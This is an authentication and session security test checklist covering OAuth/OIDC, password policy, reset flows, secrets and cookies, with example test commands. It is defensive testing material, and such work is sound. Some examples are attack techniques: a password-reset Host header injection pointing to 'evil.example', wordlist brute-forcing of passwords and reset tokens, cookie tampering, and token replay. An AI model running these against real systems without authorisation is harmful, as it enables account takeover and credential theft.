tests.title: Check that the client binds responses to its own request
tests.obj: Finds clients that accept a code or ID token from a flow they did not start.
steps: Start a login and save state, nonce and code_verifier.
Check that the values are random and tied to the browser session.
Send a callback with a code from another session.
Send a callback with a missing or wrong state.
tests.ex: Burp: replay GET /callback?code=<code of session A>&state=<state of A> in the session of B.
tests.exp: The client accepts a response only for a flow started by the same browser session. Values are unpredictable.

tests.title: Check the state parameter and PKCE in the client
tests.obj: Finds clients with no protection against forged callbacks.
steps: Capture the authorization request.
Check for PKCE with S256 or a one-time state value.
Send the callback without state and with a changed state.
Test the consent page in the same way.
tests.ex: Burp Repeater: GET /callback?code=<code> without the state parameter.
tests.exp: The client uses PKCE or checks state. Callbacks with a missing or changed value are rejected.

tests.title: Check mix-up protection when the client uses several servers
tests.obj: Finds clients that confuse responses from different authorization servers.
steps: List the authorization servers of the client.
Check for the iss parameter in the response.
Send a response that names another issuer.
Check that the client compares iss with the server it started the flow with.
tests.ex: Edit the iss parameter in the callback URL with Burp Repeater.
tests.exp: The client checks the issuer of every response and rejects a response from another server.

tests.title: Check that the client asks only for needed scopes
tests.obj: Finds clients that request more permission than they use.
steps: Capture the authorization request.
List the scope values and other authorization parameters.
Compare them with the features of the client.
tests.ex: Burp history: filter for /authorize and read the scope parameter.
tests.exp: The client requests only the scopes and parameters its features need.

tests.title: Check that the resource server checks the audience of access tokens
tests.obj: Finds resource servers that accept tokens meant for other services.
steps: Get an access token for service A.
Send it to service B.
Check the aud claim or introspection result in the code.
tests.ex: curl -H 'Authorization: Bearer <token for A>' https://service-b/api/data
tests.exp: A resource server accepts only tokens meant for itself.

tests.title: Check that the resource server enforces scope and claims
tests.obj: Finds APIs that ignore scope, sub or authorization_details.
steps: Get a token with a small scope.
Call functions that need a larger scope.
Call data of another subject.
Read the code for checks of scope, sub and authorization_details.
tests.ex: curl -X DELETE -H 'Authorization: Bearer <read-only token>' https://target/api/items/1
tests.exp: The API decides access from the delegated claims in the token. A small scope cannot do larger actions.

tests.title: Check that users are identified by issuer and subject
tests.obj: Finds APIs that identify users by claims that can be reused or reassigned.
steps: Read the claim that the API uses to find the user.
Check that it uses iss and sub together.
Check that email or name are not the key.
tests.ex: grep -rn "claims\[.email.\]\|preferred_username" src/
tests.exp: The API identifies users by iss plus sub, not by changeable claims.

tests.title: Check that the resource server checks authentication strength
tests.obj: Finds APIs that need strong or recent login but ignore acr, amr and auth_time.
steps: List functions that need strong or recent login.
Call them with a token from a weak login.
Check the acr, amr and auth_time checks in the code.
tests.ex: jwt_tool <access token> to read acr and amr; call the sensitive API with it.
tests.exp: The API checks the strength, method and age of the login before it allows the function.

tests.title: Check sender-constrained tokens
tests.obj: Finds bearer tokens that anyone can replay when stolen.
steps: Check if access tokens are bound by DPoP or mTLS.
Send a valid token from another client without the proof.
Check that the server rejects it.
tests.ex: curl -H 'Authorization: DPoP <token>' https://target/api/me without the DPoP header.
tests.exp: A token works only with the proof of the client that it is bound to.

tests.title: Check redirect URI validation
tests.obj: Finds authorization servers that send codes or tokens to unregistered URIs.
steps: Start the flow and pause at the authorization request.
Change redirect_uri to a different host, path and port.
Try a prefix, subdomain and encoding change of the registered URI.
Check that http URIs are not allowed.
tests.ex: ZAP: change redirect_uri=https%3A%2F%2Fclient.example.com%2F to a value outside the registered list.
tests.exp: The server compares redirect_uri with the registered list by exact string. It shows an error and does not redirect.

tests.title: Check that authorization codes work once and live shortly
tests.obj: Finds codes that can be replayed or that live too long.
steps: Complete a flow and save the code.
Exchange the code twice.
Check that the second try fails and that issued tokens are revoked.
Exchange a code after 10 minutes.
Try a code with another client_id, user or redirect_uri.
tests.ex: curl -X POST https://as.example.com/oauth/token -d grant_type=authorization_code -d code=<code> -d client_id=c -d redirect_uri=<uri> (twice)
tests.exp: A code works once, lives 10 minutes or less, and is bound to client, user and redirect URI. Reuse revokes the tokens.

tests.title: Check which grant types a client may use
tests.obj: Finds allowed implicit, password or other grants that the client does not need.
steps: Read the client registration.
Send token requests with other grant types.
Look for response_type=token in the authorization request.
Check that implicit and password grants are off.
tests.ex: curl -X POST https://as.example.com/oauth/token -d grant_type=password -d username=t -d password=t -d client_id=c
tests.exp: Each client can use only the grants it needs. Implicit and password grants are not used.

tests.title: Check refresh token replay protection
tests.obj: Finds refresh tokens of public clients that can be replayed.
steps: Get a refresh token.
Use it and save the new refresh token.
Use the old token again.
Check that the server revokes the token family or uses DPoP or mTLS.
tests.ex: curl -X POST https://as.example.com/token -d grant_type=refresh_token -d refresh_token=<old> -d client_id=c (twice)
tests.exp: A refresh token is sender-bound or rotated. Reuse of an old token invalidates the whole family.

tests.title: Check that PKCE is required and cannot be downgraded
tests.obj: Finds servers that accept codes without a valid code challenge.
steps: Send the authorization request without code_challenge.
Send it with an empty value and with method plain.
Send the token request without code_verifier and with a wrong one.
Use a valid verifier from another code.
tests.ex: ZAP: remove code_challenge and code_challenge_method from GET /authorize.
tests.exp: The server requires S256 PKCE and checks the verifier. All downgrade forms fail.

tests.title: Check dynamic client registration controls
tests.obj: Finds open registration that allows malicious clients.
pre: Test environment.
steps: Find the registration endpoint in the metadata.
Register a client without authentication in a test environment.
Check the validation of redirect URIs and metadata.
Check the consent warning for unknown clients.
tests.ex: curl https://as.example.com/.well-known/openid-configuration | jq .registration_endpoint
tests.exp: Open registration validates client data, asks the user for consent and warns about untrusted clients.

tests.title: Check refresh token lifetime and token expiry
tests.obj: Finds tokens that never expire.
steps: Read the lifetime of access tokens.
Use refresh tokens over time and with sliding expiry.
Check for an absolute end of life.
Use an access token after expiry.
tests.ex: curl -H 'Authorization: Bearer <token>' https://target/userinfo after 5, 10 and 30 minutes.
tests.exp: Access tokens are short lived. Refresh tokens have an absolute expiry, also with sliding expiry.

tests.title: Check that users can revoke tokens and consents
tests.obj: Finds no way to stop a malicious client or stolen token.
steps: Open the authorization server account page.
List granted clients and tokens.
Revoke a refresh token.
Use the revoked token.
tests.ex: POST /oauth/revoke token=<refresh token> then call /token with it.
tests.exp: The user can review, change and revoke consents, refresh tokens and reference access tokens. Revoked tokens fail.

tests.title: Check client authentication at the back channel
tests.obj: Finds token, PAR and revocation endpoints that work without client authentication.
steps: Send a token request for a confidential client without credentials.
Do the same for the PAR and revocation endpoints.
Check that the client secret is not in client code.
tests.ex: curl -X POST https://as.example.com/oauth/token -d grant_type=client_credentials -d client_id=c
tests.exp: Confidential clients must authenticate at every back-channel endpoint.

tests.title: Check scopes assigned to each client
tests.obj: Finds clients with scopes they do not need.
steps: List registered clients and their scopes.
Compare them with client features.
Request a scope that is not assigned.
tests.ex: curl 'https://as.example.com/authorize?client_id=c&scope=admin&response_type=code'
tests.exp: A client can get only the scopes assigned to it.

tests.title: Check allowed response_mode values
tests.obj: Finds clients that can use a response mode they do not need.
steps: Read the registration of each client.
Send a request with a different response_mode.
Check for PAR or JAR use.
tests.ex: GET /authorize?...&response_mode=fragment vs web_message.
tests.exp: The server accepts only the response modes registered for the client.

tests.title: Check PAR and protected authorization details
tests.obj: Finds requests whose parameters a user can change.
steps: Check that the code flow uses PAR for L3 systems.
Change authorization_details in the browser request.
Check that the server takes the value from the client back end.
tests.ex: curl -X POST https://as.example.com/par -u client:secret -d 'response_type=code&client_id=c&...'
tests.exp: The code grant is used with PAR. Users cannot change authorization_details.

tests.title: Check strong client authentication
tests.obj: Finds clients that use shared secrets where stronger methods are needed.
steps: Read the client authentication method.
Check for tls_client_auth, self_signed_tls_client_auth or private_key_jwt.
Check that the client is confidential.
tests.ex: curl https://as.example.com/.well-known/openid-configuration | jq .token_endpoint_auth_methods_supported
tests.exp: Clients use public-key based authentication that resists replay.

tests.title: Check the ID token nonce
tests.obj: Finds clients that accept replayed ID tokens.
steps: Start a login and note the nonce.
Replay an old ID token in a new login.
Check that the client compares the nonce claim.
tests.ex: jwt_tool <ID token> to read nonce; replay it at /callback.
tests.exp: The client rejects an ID token whose nonce does not match the request.

tests.title: Check user identity and audience in ID tokens
tests.obj: Finds clients that identify users by reusable claims or accept tokens for other clients.
steps: Read the sub, iss and aud claims.
Check that the account key is iss plus sub.
Send an ID token with another aud.
Check that aud equals the client_id.
tests.ex: jwt_tool <ID token> ; replay a token from client B at client A.
tests.exp: The client uses sub with iss to find users. It rejects tokens whose aud is not its own client_id.

tests.title: Check authorization server metadata handling
tests.obj: Finds clients that trust metadata with another issuer.
pre: Test environment.
steps: Read the pre-configured issuer URL.
Serve test metadata with another issuer URL.
Check that the client rejects it.
tests.ex: Point the discovery URL to a test server with a different issuer value.
tests.exp: The client rejects metadata when the issuer is not exactly the configured one.

tests.title: Check OIDC back-channel logout token handling
tests.obj: Finds logout flows that allow forced logout or token confusion.
steps: Send a logout token with wrong typ.
Send one with a nonce claim, and one without the events claim.
Check expiry and signature checks.
tests.ex: curl -X POST https://client.example.com/backchannel-logout -d logout_token=<test token>
tests.exp: The client accepts only logout+jwt tokens with the correct event claim, no nonce and a short life.

tests.title: Check the response types of the OpenID Provider
tests.obj: Finds providers that allow implicit flow responses.
steps: Read the response_types_supported metadata.
Request response_type=token and id_token token.
Check that only code, ciba, id_token and id_token code work.
tests.ex: curl https://op.example.com/.well-known/openid-configuration | jq .response_types_supported
tests.exp: The provider does not allow response types that return access tokens in the front channel.

tests.title: Check forced logout protection at the OpenID Provider
tests.obj: Finds logout endpoints that end sessions without user consent.
steps: Open the logout URL from another site with no id_token_hint.
Check for a confirmation page.
Check the checks of id_token_hint and the redirect URI.
tests.ex: Open https://op.example.com/logout from a cross-site page.
tests.exp: The provider asks the user to confirm or validates the logout request parameters.

tests.title: Check user consent and the information shown
tests.obj: Finds missing or unclear consent for authorization requests.
steps: Start a flow with a new client.
Check that consent is asked for each request, always when the client is unknown.
Check that the page names the client, scopes and lifetime.
Check the consent page for CSRF and framing.
tests.ex: curl -I https://as.example.com/consent | grep -i 'x-frame-options\|frame-ancestors'
tests.exp: The user gives clear consent for each request. The page cannot be framed, and a changed state is rejected.

tests.title: Check the types of grant in use and leaks of OAuth credentials
tests.obj: Finds deprecated grants and tokens or codes exposed in URLs and Referer.
steps: Find the grant type of each flow from the token and authorize requests.
Look for tokens or codes in URLs.
Look at the Referer header sent to other sites.
Check for the Referrer-Policy header.
tests.ex: ZAP history: search the Referer header for code= and access_token=.
tests.exp: Public clients use code with PKCE. Secrets are not in URLs. Referrer-Policy limits leaks.

tests.title: Check for exposed client secrets and token storage in the client
tests.obj: Finds client secrets in public clients and tokens kept in local storage.
steps: Search the client code for client_secret.
Look at the authorization traffic for secrets.
Look at where tokens are stored.
For implicit flows, check for access token injection.
tests.ex: DevTools Debugger: Ctrl+Shift+F for client_secret; Application tab for tokens.
tests.exp: Public clients have no secret. Tokens are not stored in local storage. Injected tokens are rejected.

tests.title: Check the minimum password length
tests.obj: Finds weak minimum length rules that allow short passwords.
steps: Register a new account with passwords of 4, 7, 8, 14 and 15 characters.
Change the password of a test account to the same lengths.
Look at the rule in the documentation. Compare it with what the server accepts.
Send the short password directly to the API and skip client-side checks.
tests.ex: curl -s -X POST https://target/api/register -H 'Content-Type: application/json' -d '{"email":"t1@test.example","password":"Ab1!xyz"}' -i
tests.exp: The server rejects passwords shorter than 8 characters. The application sets 15 characters where MFA is not used. Client-side checks are not the only control.

tests.title: Check that long passwords and passphrases are accepted
tests.obj: Finds a low maximum password length that blocks passphrases.
steps: Set a password of 64 characters, then 128 characters.
Log in with each password.
Use spaces and Unicode characters in a long password.
Look for silent cut-off: change only the last character and log in.
tests.ex: python3 -c "print('a'*63+'X')" | xargs -I{} curl -s -d 'password={}&new=1' https://target/change
tests.exp: Passwords of at least 64 characters are accepted and fully used. The application sets a sane upper limit and shows an error if it is exceeded.

tests.title: Check that the password is used exactly as the user typed it
tests.obj: Finds truncation, case change or other changes to the password before it is checked.
steps: Set a password with upper-case letters and 80 characters.
Log in with the same password in lower case.
Log in with only the first 72 characters and with only the first 64 characters.
Log in with the first 8 characters.
tests.ex: Burp Repeater: login with password = first 72 chars of the set value; then with the value in lower case.
tests.exp: Only the exact password is accepted. The application does not truncate or change the case of the password.

tests.title: Test the change password function
tests.obj: Finds password change that works without the current password or the right user.
steps: Log in and change the password with the correct current password.
Send the change request without the current password.
Send it with a wrong current password.
Change the user or ID parameter to another account.
Make sure the old password no longer works.
tests.ex: curl -i -b 'session=<id>' -d 'new=Passw0rd-long-and-new&confirm=Passw0rd-long-and-new' https://target/account/password
tests.exp: The user can change the password. The server needs the current and the new password and acts only on the session user.

tests.title: Check new passwords against a list of common passwords
tests.obj: Finds acceptance of the most common passwords.
steps: Try to register with 10 passwords from the top 3000 list that meet the length rule.
Try the same passwords on the change function.
Try Password1, 123456789012345 and qwertyuiopasdfg.
tests.ex: ffuf -w 10k-most-common.txt -X POST -d '{"email":"u@test.example","password":"FUZZ"}' -H 'Content-Type: application/json' -u https://target/api/register -mc 200,201
tests.exp: The application rejects every password from the top 3000 list at registration and at change.

tests.title: Check new passwords against breached passwords
tests.obj: Finds missing checks against known leaked passwords.
steps: Pick a password that is in Pwned Passwords but meets the length rule.
Try to register with it. Then try to change a password to it.
Read the code or documentation for the data source.
tests.ex: Check candidate hash prefix: curl https://api.pwnedpasswords.com/range/21BD1 ; then POST the plain password to /register.
tests.exp: The application rejects breached passwords at registration and at password change.

tests.title: Check the list of context-specific words for passwords
tests.obj: Finds missing documentation or missing use of words such as company and product names.
steps: Get the documented list of context-specific words.
Make sure it holds the organization, product, project and department names.
Try to set passwords built from these words.
Make sure the application rejects them.
tests.ex: Registration with password 'AcmeWidgetPortal2024!' and the documented words in Burp Repeater.
tests.exp: The list is documented. The application rejects passwords that are built from these words.

tests.title: Check that no composition rules limit password characters
tests.obj: Finds rules that force or ban character types and so reduce password quality.
steps: Set a password of only lower-case letters and 20 characters.
Set a password with spaces, Unicode and symbols.
Read the registration help text for composition rules.
tests.ex: POST /register password='correct horse battery staple' (no digits or symbols); then password with emoji and tab.
tests.exp: Passwords of any composition are accepted if they meet the length rule. No minimum count of any character type is required.

tests.title: Check the password field masking and paste support
tests.obj: Finds password fields that show the text or block paste and password managers.
steps: Look at the HTML of the login, registration and change forms.
Make sure the field is type=password.
Paste a value into the password and MFA fields.
Use a browser or external password manager to fill the form.
tests.ex: DevTools console: [...document.querySelectorAll('input')].map(i=>[i.name,i.type,i.onpaste])
tests.exp: Password fields use type=password. Paste and password managers work. The user can show the value on purpose.

tests.title: Check that the application does not force password rotation
tests.obj: Finds forced periodic password change, which weakens passwords.
steps: Read the password policy and the application settings.
Look for an expiry period in the user store.
Log in with an account that has an old password.
tests.ex: grep -rn 'password.*expire\|maxAge\|rotation' config/ ; ldapsearch for pwdMaxAge on the user store.
tests.exp: A password stays valid until it is found compromised or the user changes it. No periodic rotation is required.

tests.title: Check that the password policy is the same everywhere
tests.obj: Finds weaker password rules in reset, change or admin flows.
steps: Set a weak password at registration and note the error.
Try the same password on change, reset and admin create-user.
Try to reuse the last password and change the password five times in a row.
Try to use the user name in the password.
tests.ex: Run the same short password with Burp Intruder against /register, /account/password and /reset/confirm.
tests.exp: Registration, change, reset and admin flows apply the same rules. The server enforces them.

tests.title: Check how passwords are stored
tests.obj: Finds plain text, reversible or fast-hash storage of passwords.
pre: Read access to code or database.
steps: Read the code or database for the password column.
Make sure it holds a hash made with Argon2id, scrypt, bcrypt or PBKDF2.
Check the cost settings against the cheat sheet minimum.
Make sure each hash has its own random salt.
Look for logs and backups with plain passwords.
tests.ex: SELECT password FROM users LIMIT 3; hashid '<hash>'; grep -rn 'md5(\|sha1(\|bcrypt\|argon2' src/
tests.exp: Passwords are hashed with a slow, salted algorithm at the recommended cost. No plain text or reversible form exists.

tests.title: Check the safe comparison of password hashes
tests.obj: Finds timing leaks and type confusion in the password check.
steps: Read the code that compares the hash.
Make sure it uses a library function with constant time.
Make sure the function has an input length limit and fixed types.
Measure response time for users with a correct and a wrong first character.
tests.ex: grep -rn "hash_equals\|timingSafeEqual\|compare_digest\|ConstantTimeCompare" src/ ; ab or Burp Intruder timing for 200 requests.
tests.exp: The code uses a constant-time function with fixed types and length limits.

tests.title: Check that security questions and hints are absent
tests.obj: Finds knowledge-based recovery that attackers can guess or look up.
steps: Open registration, profile and password recovery pages.
Look for security questions, hints and secret answers.
Look at the account recovery API for question fields.
tests.ex: grep -rni 'security question\|secret question\|maiden' templates/ ; Burp search for 'question' in proxy history.
tests.exp: No password hints or security questions exist for authentication or recovery.

tests.title: Test weak security questions if they still exist
tests.obj: Finds guessable questions, self-written questions and answers without brute-force limits.
pre: Do not run on production.
steps: List all pre-set questions. Mark questions with public, short-list or guessable answers.
Create a custom question such as What is 1+1.
Send 100 wrong answers and look for a lockout.
Check how many questions the recovery needs.
tests.ex: Burp Intruder with a first-name wordlist on the answer parameter of POST /recover/question.
tests.exp: No question has a guessable answer. Users cannot write their own question. Wrong answers trigger a lockout or delay. Remove the function if possible.

tests.title: Check initial passwords and activation codes
tests.obj: Finds predictable, reusable or long-lived system-generated initial secrets.
pre: Mail catcher or test mailbox.
steps: Create five accounts quickly and collect the initial passwords or codes.
Look for patterns, shared strings, hashes of user data or time links.
Use a code twice and after its lifetime.
Check if the user must change the initial password.
Check that the initial password follows the policy.
tests.ex: for i in 1 2 3 4 5; do curl -s -d "email=u$i@test.example" https://target/invite; done ; then compare the mails in the mail catcher.
tests.exp: Initial secrets are random, follow the password policy, and expire quickly or after first use. The user must set a new password.

tests.title: Check that password reset gives no account enumeration
tests.obj: Finds different messages or times for known and unknown accounts in the reset form.
steps: Request a reset for a known email address. Save message, status, length and time.
Request a reset for an unknown address. Compare all values.
Send 20 requests for each case and compare the average time.
Repeat on the SMS or phone reset path.
tests.ex: for u in known@test.example nobody@test.example; do curl -s -o /dev/null -w "$u %{http_code} %{size_download} %{time_total}\n" -d "email=$u" https://target/forgot; done
tests.exp: The response is the same for known and unknown accounts, in message, status and time.

tests.title: Check the reset token: randomness, life, single use and storage
tests.obj: Finds reset tokens that are guessable, reusable, long lived or stored in plain text.
pre: Test mailbox.
Do not run on production.
steps: Request five reset links. Examine the tokens for patterns and length.
Use a token once and then again.
Wait for the lifetime to pass. Use the token.
Request a new token. Check that the old token stops working.
Read the code or database for plain-text token storage.
Send many token guesses and look for a rate limit.
tests.ex: Burp Sequencer on the token from the reset mail; ffuf -w tokens.txt -u 'https://target/reset?token=FUZZ' -mc 200
tests.exp: Tokens are random and long, single use, and short lived. A new request cancels the old token. The server stores only hashes and rate limits guesses.

tests.title: Test reset link for Host header injection and token leak
tests.obj: Finds reset links built from the Host header and tokens that leak by Referer.
pre: Test mailbox.
steps: Send the reset request with a changed Host or X-Forwarded-Host header.
Read the link in the mail.
Open the reset link and look at requests to other domains.
Look for the token in the Referer header and for a Referrer-Policy header.
Change a user ID parameter in the reset link.
tests.ex: curl -i https://target/forgot -H 'Host: evil.example' -H 'X-Forwarded-Host: evil.example' -d 'email=victim@test.example'
tests.exp: Reset links use a fixed trusted host and HTTPS. The reset page sends no token to third parties and sets Referrer-Policy. The token alone selects the user.

tests.title: Check what happens after a password reset
tests.obj: Finds resets that leave old sessions alive, log the user in, or send the password.
steps: Log in on two browsers with the same account.
Reset the password in one browser.
Check if the other session still works.
Look at the reset mail and the response for the new password.
Check that the user must log in with the new password.
tests.ex: Browser A: reset flow. Browser B: curl -b 'session=<old>' https://target/account -i
tests.exp: The reset does not send the password or log in the user. The user gets a notice and old sessions end or can be ended.

tests.title: Check that admins cannot set a user password
tests.obj: Finds admin functions that let staff choose or learn a user password.
steps: Log in as administrator and open the user management page.
Find the reset function for a user.
Check if the administrator can type the new password.
Check that the function only starts the reset flow for the user.
tests.ex: Burp: POST /admin/users/42/reset with a 'password' parameter added; watch if the value is accepted.
tests.exp: Administrators can start a reset for the user but cannot set or see the password.

tests.title: Check reminders before authentication factors expire
tests.obj: Finds expiring credentials, certificates or tokens with no reminder.
steps: List the factors that expire: passwords, certificates, tokens.
Read the reminder rules.
Create a test factor that is near expiry.
Check that the user gets reminders in time to renew.
tests.ex: Set the certificate notAfter to 7 days from now on a test user; read the mail catcher the next day.
tests.exp: Users get automatic reminders early enough to renew a factor before it expires.

tests.title: Make sure a secrets management solution stores backend secrets with least privilege
tests.obj: Find secrets in code, files or environment variables and secret stores with wide access.
steps: Ask which solution stores passwords, API keys, key material and tokens (a key vault).
Search the code, images, CI variables and environment for plain-text secrets.
Review the access policy of the vault for each secret and role.
Check that secrets are created, accessed and destroyed through the vault and logged.
tests.ex: trufflehog filesystem . ; docker history --no-trunc app:latest | grep -iE 'password|secret|key'; vault policy read app-policy
tests.exp: A vault holds all backend secrets. Access is least-privilege, logged, and no plain-text secret exists in code or images.

tests.title: Review the list of critical secrets and the rotation schedule
tests.obj: Find secrets with no rotation plan, no expiry or old age.
steps: Ask for the document that lists the critical secrets and their rotation schedule.
Check the age of each secret in the vault or key store.
Check that the secrets expire and rotate on the documented schedule.
Do a test rotation of one secret and check that the application keeps working.
tests.ex: vault read -format=json secret/metadata/app | jq .data.created_time; aws secretsmanager describe-secret --secret-id app/db | jq .LastRotatedDate
tests.exp: Critical secrets are documented, have an expiry, and rotate on the schedule without downtime.

tests.title: Check that cryptographic operations run in an isolated security module
tests.obj: Find private keys that application memory or the file system can read.
steps: Ask which operations use a vault, HSM or cloud KMS.
Check that key material is not exported out of the module.
Try to read key files or memory of the application in a test system.
Check key access policy and audit logs of the module.
tests.ex: aws kms describe-key --key-id alias/app; pkcs11-tool --list-objects; check for exportable flag
tests.exp: Key material stays in the security module. The application sends data to the module for each operation.

tests.title: Read the documentation of timeouts and re-authentication
tests.obj: Finds missing or unjustified session timeout rules.
pre: Access to documentation and configuration.
steps: Get the session documentation.
Find the idle timeout and the absolute session lifetime.
Make sure the document explains why the values fit the risk.
Make sure it explains any difference from NIST SP 800-63B re-authentication rules.
tests.ex: Compare the documented values with the framework setting, for example server.servlet.session.timeout or SESSION_COOKIE_AGE.
tests.exp: The idle timeout and the absolute lifetime are documented with a reason that fits the risk and with any deviation explained.

tests.title: Read the documentation of concurrent sessions
tests.obj: Finds missing rules for the number of parallel sessions.
pre: Access to documentation.
steps: Get the session documentation.
Find the maximum number of sessions for one account.
Find what happens when the maximum is reached.
Compare with the real behavior.
tests.ex: Log in 10 times with curl -c jar<N>.txt and compare to the documented limit.
tests.exp: The maximum number of sessions and the action at the limit are documented and match the behavior.

tests.title: Read the documentation of federated session control
tests.obj: Finds missing rules for session lifetime and logout between SSO systems.
pre: Access to documentation.
steps: List all systems that create sessions in the SSO setup.
Get the documentation of how lifetimes and logout are linked.
Make sure it names the events that need re-authentication.
tests.ex: Review IdP and SP configuration: session lifetime, SLO endpoints and back-channel logout URLs.
tests.exp: All session-creating systems are documented with the way they coordinate lifetime, logout and re-authentication.

tests.title: Check that a trusted back end validates session tokens
tests.obj: Finds session checks done only in the client.
steps: Find where the application checks the session token.
Change or remove client-side checks with a proxy.
Send a request with a forged or empty token to a protected endpoint.
tests.ex: curl -i -H 'Authorization: Bearer forged' https://target/api/me ; curl -i https://target/api/me
tests.exp: A trusted back-end service validates every session token. Client-side checks are not relied upon.

tests.title: Check that sessions use generated tokens and not static keys
tests.obj: Finds static API keys or shared secrets used as session identifiers.
steps: Log in twice with the same account.
Compare the session tokens.
Look for long-lived values in the requests that never change.
Check that the token changes at each login.
tests.ex: Burp Comparer on two login responses; grep -i 'api[_-]key' in the page source.
tests.exp: Each session has a new dynamically generated token. No static secret acts as a session token.

tests.title: Check session ID strength and randomness
tests.obj: Finds predictable or short session IDs.
steps: Collect 5000 session IDs with new sessions.
Decode the IDs and look for user data, time or counters.
Run an entropy analysis.
Check the length: at least 128 bits of entropy for reference tokens.
Change a few characters of a valid ID and test it.
tests.ex: Burp Sequencer: live capture of Set-Cookie JSESSIONID, 5000 samples, then FIPS tests.
tests.exp: Session IDs are unique, come from a CSPRNG, have at least 128 bits of entropy, and hold no meaning.

tests.title: Check the cookie structure and manipulation of session data
tests.obj: Finds cookies that hold readable or editable data such as roles and user names.
steps: Collect all cookies and map each to its function.
Decode each value: Base64, hex, URL and hash forms.
Change non-signed values, such as IsAdmin=No, and send the request.
Send unusual characters and a very long cookie.
Make sure the cookie name does not show the framework.
tests.ex: echo '<cookie>' | base64 -d ; Burp Repeater: Cookie: IsAdmin=Yes
tests.exp: Cookies hold no sensitive data in clear text. Changed values are rejected. Cookie names do not reveal the technology.

tests.title: Check the Secure and HttpOnly cookie attributes
tests.obj: Finds session cookies that travel over HTTP or that scripts can read.
steps: List all Set-Cookie headers after login.
Make sure each session cookie has Secure and HttpOnly.
Request the HTTP version of the site and look for the cookie.
Read document.cookie in the console.
tests.ex: curl -skI https://target/login -d 'u=t&p=t' | grep -i set-cookie ; ZAP passive scan: Cookie without Secure/HttpOnly
tests.exp: Session cookies have Secure and HttpOnly. They are never sent over HTTP and are not in document.cookie.

tests.title: Check the SameSite attribute and cookie prefixes
tests.obj: Finds missing SameSite and __Host- protection on session cookies.
steps: Look at the SameSite value of each session cookie.
Check the prefix: __Host- is best, __Secure- if subdomains share cookies.
Try to set a cookie with the same name from a subdomain.
Check the browser behavior with the attribute missing.
tests.ex: Expected header: Set-Cookie: __Host-SID=<token>; Path=/; Secure; HttpOnly; SameSite=Strict
tests.exp: Session cookies use SameSite=Lax or Strict and the __Host- prefix when possible. A subdomain cannot overwrite them.

tests.title: Check the Domain, Path and Expires scope of session cookies
tests.obj: Finds cookies shared with other apps or subdomains, and persistent session cookies.
steps: Read the Domain and Path attributes of the session cookie.
Check that Domain is not set, or is as narrow as possible.
List other apps on the same domain that can read the cookie.
Check Expires and Max-Age. A session cookie must not be persistent.
Close the browser and open it again.
tests.ex: curl -sI https://target/login -d 'u=t&p=t' | grep -i 'domain=\|expires\|max-age'
tests.exp: Session cookies have a narrow scope and no persistent expiry. Other apps and subdomains do not get them.

tests.title: Check that the session ID changes at login and privilege change
tests.obj: Finds session fixation, where an attacker sets the session ID before login.
steps: Open the login page and save the session cookie.
Log in and look at the cookie after login.
Send the old cookie value after login.
Set a chosen cookie value with a proxy and log in.
Repeat after re-authentication and after a role change.
tests.ex: curl -sc a.txt https://target/login >/dev/null; curl -b a.txt -c b.txt -d 'u=t&p=t' https://target/login; diff a.txt b.txt
tests.exp: The application issues a new token at each login and re-authentication. The old token ends. It does not accept a session ID that the client chose.

tests.title: Check that session IDs are not in URLs
tests.obj: Finds session IDs in URLs, hidden fields or accepted from unplanned places.
steps: Examine all links and forms for session IDs in the URL.
Send the session ID in a URL parameter instead of the cookie.
Send a POST login as a GET request.
